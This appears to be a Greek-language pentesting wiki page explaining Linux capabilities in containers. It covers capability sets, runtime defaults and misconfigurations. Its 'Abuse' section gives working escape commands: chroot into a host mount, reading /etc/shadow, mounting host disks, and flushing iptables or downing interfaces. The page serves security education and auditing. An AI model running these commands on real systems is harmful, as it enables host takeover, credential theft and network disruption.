# Linux Capabilities Σε Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Οι Linux capabilities είναι ένα από τα σημαντικότερα στοιχεία του container security, επειδή απαντούν σε ένα λεπτό αλλά θεμελιώδες ερώτημα: **τι σημαίνει πραγματικά το "root" μέσα σε ένα container;** Σε ένα κανονικό Linux σύστημα, το UID 0 ιστορικά συνεπαγόταν ένα πολύ ευρύ σύνολο δικαιωμάτων. Στους σύγχρονους kernels, αυτό το προνόμιο διαχωρίζεται σε μικρότερες μονάδες που ονομάζονται capabilities. Μια διεργασία μπορεί να εκτελείται ως root και παρ' όλα αυτά να μην έχει πολλές ισχυρές δυνατότητες, αν έχουν αφαιρεθεί οι σχετικές capabilities.

Τα Containers βασίζονται σε μεγάλο βαθμό σε αυτή τη διάκριση. Πολλά workloads εξακολουθούν να εκκινούν ως UID 0 μέσα στο container για λόγους συμβατότητας ή απλότητας. Χωρίς την αφαίρεση capabilities, αυτό θα ήταν υπερβολικά επικίνδυνο. Με την αφαίρεση capabilities, μια διεργασία root μέσα σε container μπορεί να εκτελεί πολλές συνηθισμένες εργασίες εντός του container, ενώ δεν της επιτρέπονται πιο ευαίσθητες λειτουργίες του kernel. Γι' αυτό ένα shell σε container που εμφανίζει `uid=0(root)` δεν σημαίνει αυτόματα "host root" ούτε καν "ευρύ kernel privilege". Τα capability sets καθορίζουν πόση πραγματική αξία έχει αυτή η ταυτότητα root.

Για την πλήρη αναφορά των Linux capabilities και πολλά παραδείγματα abuse, δείτε:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Λειτουργία

Οι capabilities παρακολουθούνται σε διάφορα sets, όπως permitted, effective, inheritable, ambient και bounding sets. Για πολλές αξιολογήσεις container, τα ακριβή semantics του kernel για κάθε set είναι λιγότερο σημαντικά από το άμεσο πρακτικό ερώτημα: **ποιες privileged operations μπορεί να εκτελέσει επιτυχώς αυτή η διεργασία αυτή τη στιγμή και ποια μελλοντικά privilege gains είναι ακόμη δυνατά;**

Ο λόγος που αυτό έχει σημασία είναι ότι πολλές breakout techniques είναι στην πραγματικότητα προβλήματα capabilities που εμφανίζονται ως προβλήματα containers. Ένα workload με `CAP_SYS_ADMIN` μπορεί να αποκτήσει πρόσβαση σε τεράστιο μέρος της λειτουργικότητας του kernel, την οποία ένα κανονικό container root process δεν θα έπρεπε να αγγίζει. Ένα workload με `CAP_NET_ADMIN` γίνεται πολύ πιο επικίνδυνο αν μοιράζεται επίσης το host network namespace. Ένα workload με `CAP_SYS_PTRACE` γίνεται πολύ πιο ενδιαφέρον αν μπορεί να βλέπει host processes μέσω host PID sharing. Στο Docker ή στο Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, ενώ στο Kubernetes συνήθως εμφανίζεται ως `hostPID: true`.

Με άλλα λόγια, το capability set δεν μπορεί να αξιολογηθεί μεμονωμένα. Πρέπει να εξετάζεται μαζί με τα namespaces, το seccomp και την MAC policy.

## Εργαστήριο

Ένας πολύ άμεσος τρόπος για να ελέγξετε τις capabilities μέσα σε ένα container είναι:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Μπορείτε επίσης να συγκρίνετε ένα πιο περιοριστικό container με ένα στο οποίο έχουν προστεθεί όλες οι capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Για να δείτε την επίδραση μιας περιορισμένης προσθήκης, δοκιμάστε να αφαιρέσετε τα πάντα και να προσθέσετε ξανά μόνο μία capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Αυτά τα μικρά πειράματα βοηθούν να φανεί ότι ένα runtime δεν ενεργοποιεί απλώς ένα boolean με όνομα "privileged". Διαμορφώνει την πραγματική επιφάνεια προνομίων που είναι διαθέσιμη στη διεργασία.

## Capabilities Υψηλού Κινδύνου

Παρότι πολλές capabilities μπορεί να είναι σημαντικές ανάλογα με τον στόχο, ορισμένες είναι επανειλημμένα σχετικές στην ανάλυση container escape.

Η **`CAP_SYS_ADMIN`** είναι αυτή που οι defenders πρέπει να αντιμετωπίζουν με τη μεγαλύτερη καχυποψία. Συχνά περιγράφεται ως "the new root", επειδή ξεκλειδώνει τεράστιο εύρος λειτουργιών, συμπεριλαμβανομένων ενεργειών που σχετίζονται με mount, συμπεριφοράς ευαίσθητης σε namespaces και πολλών kernel paths που δεν θα έπρεπε ποτέ να εκτίθενται απερίσκεπτα σε containers. Αν ένα container διαθέτει `CAP_SYS_ADMIN`, weak seccomp και δεν υπάρχει ισχυρός περιορισμός MAC, πολλά κλασικά breakout paths γίνονται πολύ πιο ρεαλιστικά.

Η **`CAP_SYS_PTRACE`** έχει σημασία όταν υπάρχει ορατότητα διεργασιών, ειδικά αν το PID namespace είναι κοινό με το host ή με ενδιαφέροντα neighboring workloads. Μπορεί να μετατρέψει την ορατότητα σε tampering.

Οι **`CAP_NET_ADMIN`** και **`CAP_NET_RAW`** έχουν σημασία σε network-focused περιβάλλοντα. Σε ένα isolated bridge network μπορεί ήδη να είναι επικίνδυνες· σε ένα shared host network namespace είναι πολύ χειρότερα, επειδή το workload ενδέχεται να μπορεί να επαναδιαμορφώσει το host networking, να κάνει sniff, spoof ή να παρεμβαίνει σε τοπικές ροές traffic.

Η **`CAP_SYS_MODULE`** είναι συνήθως καταστροφική σε rootful περιβάλλον, επειδή η φόρτωση kernel modules ισοδυναμεί ουσιαστικά με έλεγχο του host kernel. Σχεδόν ποτέ δεν θα έπρεπε να εμφανίζεται σε general-purpose container workload.

## Χρήση από Runtime

Τα Docker, Podman, stacks που βασίζονται στο containerd και το CRI-O χρησιμοποιούν controls για capabilities, όμως τα defaults και τα management interfaces διαφέρουν. Το Docker τις εκθέτει πολύ άμεσα μέσω flags όπως τα `--cap-drop` και `--cap-add`. Το Podman εκθέτει παρόμοια controls και συχνά επωφελείται από rootless execution ως πρόσθετο safety layer. Το Kubernetes εμφανίζει capability additions και drops μέσω του `securityContext` του Pod ή του container. System-container περιβάλλοντα όπως τα LXC/Incus βασίζονται επίσης σε capability control, όμως η ευρύτερη ενσωμάτωση αυτών των συστημάτων στο host συχνά ωθεί τους operators να χαλαρώνουν τα defaults πιο επιθετικά απ' ό,τι θα έκαναν σε ένα app-container περιβάλλον.

Η ίδια αρχή ισχύει σε όλα: μια capability που είναι τεχνικά δυνατό να δοθεί δεν είναι απαραίτητα capability που πρέπει να δοθεί. Πολλά περιστατικά στον πραγματικό κόσμο ξεκινούν όταν ένας operator προσθέτει μια capability απλώς επειδή ένα workload απέτυχε υπό αυστηρότερη ρύθμιση και η ομάδα χρειαζόταν μια γρήγορη λύση.

## Misconfigurations

Το πιο προφανές λάθος είναι το **`--cap-add=ALL`** σε CLIs τύπου Docker/Podman, αλλά δεν είναι το μόνο. Στην πράξη, ένα συχνότερο πρόβλημα είναι η παραχώρηση μίας ή δύο εξαιρετικά ισχυρών capabilities, ειδικά της `CAP_SYS_ADMIN`, για να "λειτουργήσει η εφαρμογή", χωρίς παράλληλη κατανόηση των επιπτώσεων στα namespaces, στο seccomp και στα mounts. Ένα ακόμη συχνό failure mode είναι ο συνδυασμός επιπλέον capabilities με shared host namespaces. Στα Docker ή Podman αυτό μπορεί να εμφανίζεται ως `--pid=host`, `--network=host` ή `--userns=host`· στο Kubernetes η αντίστοιχη έκθεση εμφανίζεται συνήθως μέσω workload settings όπως `hostPID: true` ή `hostNetwork: true`. Κάθε ένας από αυτούς τους συνδυασμούς αλλάζει το τι μπορεί πραγματικά να επηρεάσει η capability.

Είναι επίσης συχνό οι administrators να πιστεύουν ότι, επειδή ένα workload δεν είναι πλήρως `--privileged`, εξακολουθεί να περιορίζεται ουσιαστικά. Μερικές φορές αυτό ισχύει, αλλά μερικές φορές το effective posture είναι ήδη αρκετά κοντά στο privileged, ώστε η διάκριση να παύει να έχει operational σημασία.

## Abuse

Το πρώτο πρακτικό βήμα είναι να γίνει enumeration του effective capability set και αμέσως να δοκιμαστούν οι capability-specific ενέργειες που θα είχαν σημασία για escape ή για πρόσβαση σε πληροφορίες του host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Αν υπάρχει το `CAP_SYS_ADMIN`, ελέγξτε πρώτα για καταχρήσεις που βασίζονται σε `mount` και πρόσβαση στο filesystem του host, καθώς αυτό αποτελεί έναν από τους πιο συνηθισμένους μηχανισμούς διευκόλυνσης breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Εάν υπάρχει το `CAP_SYS_PTRACE` και το container μπορεί να δει ενδιαφέρουσες διεργασίες, επαληθεύστε εάν το capability μπορεί να αξιοποιηθεί για έλεγχο διεργασιών:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Εάν υπάρχει το `CAP_NET_ADMIN` ή το `CAP_NET_RAW`, ελέγξτε αν το workload μπορεί να χειριστεί το ορατό network stack ή τουλάχιστον να συλλέξει χρήσιμες πληροφορίες για το δίκτυο:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Όταν ένα capability test είναι επιτυχές, συνδύασέ το με την κατάσταση των namespaces. Ένα capability που φαίνεται απλώς επικίνδυνο σε ένα isolated namespace μπορεί να γίνει αμέσως escape ή host-recon primitive όταν το container μοιράζεται επίσης το host PID, το host network ή τα host mounts.

### Πλήρες Παράδειγμα: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Αν το container διαθέτει `CAP_SYS_ADMIN` και ένα writable bind mount του host filesystem, όπως το `/host`, η διαδρομή του escape είναι συχνά απλή:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Εάν το `chroot` ολοκληρωθεί με επιτυχία, οι εντολές εκτελούνται πλέον στο πλαίσιο του root filesystem του host:
```bash
id
hostname
cat /etc/shadow | head
```
Αν το `chroot` δεν είναι διαθέσιμο, το ίδιο αποτέλεσμα μπορεί συχνά να επιτευχθεί καλώντας το binary μέσω του mounted tree:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Πλήρες Παράδειγμα: `CAP_SYS_ADMIN` + Πρόσβαση σε Συσκευή

Αν εκτεθεί μια block device από το host, το `CAP_SYS_ADMIN` μπορεί να τη μετατρέψει σε άμεση πρόσβαση στο filesystem του host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Πλήρες Παράδειγμα: `CAP_NET_ADMIN` + Host Networking

Αυτός ο συνδυασμός δεν παρέχει πάντα απευθείας host root, αλλά μπορεί να επαναδιαμορφώσει πλήρως το network stack του host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Αυτό μπορεί να επιτρέψει denial of service, traffic interception ή πρόσβαση σε services που προηγουμένως φιλτράρονταν.

## Έλεγχοι

Ο στόχος των capability checks δεν είναι μόνο η εξαγωγή ακατέργαστων τιμών, αλλά η κατανόηση του κατά πόσο το process έχει αρκετά privileges ώστε ο τρέχων namespace και η mount κατάστασή του να είναι επικίνδυνα.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Τι είναι σημαντικό εδώ:

- Το `capsh --print` είναι ο ευκολότερος τρόπος για να εντοπίσετε capabilities υψηλού κινδύνου, όπως `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ή `cap_sys_module`.
- Η γραμμή `CapEff` στο `/proc/self/status` σάς δείχνει τι είναι πραγματικά effective τώρα, όχι απλώς τι μπορεί να είναι διαθέσιμο σε άλλα sets.
- Ένα capability dump γίνεται πολύ σημαντικότερο αν το container μοιράζεται επίσης host PID, network ή user namespaces ή διαθέτει writable host mounts.

Αφού συλλέξετε τις raw πληροφορίες των capabilities, το επόμενο βήμα είναι η ερμηνεία τους. Εξετάστε αν η διεργασία είναι root, αν είναι ενεργά τα user namespaces, αν μοιράζονται host namespaces, αν το seccomp εφαρμόζεται και αν το AppArmor ή το SELinux εξακολουθούν να περιορίζουν τη διεργασία. Ένα capability set από μόνο του αποτελεί μόνο μέρος της εικόνας, αλλά συχνά είναι το στοιχείο που εξηγεί γιατί ένα container breakout λειτουργεί, ενώ ένα άλλο αποτυγχάνει με το ίδιο φαινομενικό σημείο εκκίνησης.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Μειωμένο capability set by default | Το Docker διατηρεί μια default allowlist capabilities και κάνει drop τα υπόλοιπα | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Μειωμένο capability set by default | Τα Podman containers είναι unprivileged by default και χρησιμοποιούν ένα reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Κληρονομεί τα runtime defaults, εκτός αν αλλάξουν | Αν δεν καθοριστούν `securityContext.capabilities`, το container λαμβάνει το default capability set από το runtime | `securityContext.capabilities.add`, αποτυχία χρήσης `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Συνήθως runtime default | Το effective set εξαρτάται από το runtime και το Pod spec | ίδιο με τη γραμμή του Kubernetes· η direct OCI/CRI configuration μπορεί επίσης να προσθέσει capabilities ρητά |

Για το Kubernetes, το σημαντικό σημείο είναι ότι το API δεν ορίζει ένα ενιαίο universal default capability set. Αν το Pod δεν προσθέτει ή δεν κάνει drop capabilities, το workload κληρονομεί το runtime default για το συγκεκριμένο node.
{{#include ../../../../banners/hacktricks-training.md}}
